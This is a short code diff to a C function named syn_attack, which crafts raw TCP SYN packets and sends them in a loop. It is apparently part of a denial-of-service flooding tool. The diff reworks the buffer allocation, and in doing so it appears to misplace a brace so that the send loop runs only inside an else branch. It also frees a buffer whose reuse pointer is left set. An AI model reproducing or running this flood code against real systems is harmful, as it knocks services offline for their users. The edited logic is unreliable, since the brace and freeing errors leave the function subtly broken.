@@ -29,16 +29,19 @@ void* syn_attack(void* arg) {
     int min_packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
     int packet_size = params->psize > 0 ? params->psize : 40;
     if (packet_size < min_packet_size) packet_size = min_packet_size;
-    if (packet == NULL || last_packet_size != packet_size) {
-        if (packet) free(packet);
-        packet = malloc(packet_size);
+    if (packet && last_packet_size < packet_size) {
+        free(packet);
+        packet = NULL;
+    }
+    if (!packet) {
+        packet = calloc(1, packet_size);
         if (!packet) {
             close(syn_sock);
             return NULL;
         }
         last_packet_size = packet_size;
-    }
-    memset(packet, 0, packet_size);
+    } else {
+        memset(packet, 0, packet_size);
 
     struct iphdr* iph = (struct iphdr*) packet;
     struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));
@@ -81,8 +84,9 @@ void* syn_attack(void* arg) {
         tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr, IPPROTO_TCP);
         ssize_t sent = sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
         if (sent < 0) break;
-    }   
-    //no need to free packet here as well
+    } 
+    if (packet) free(packet);
     close(syn_sock);
     return NULL;
+    }
 }
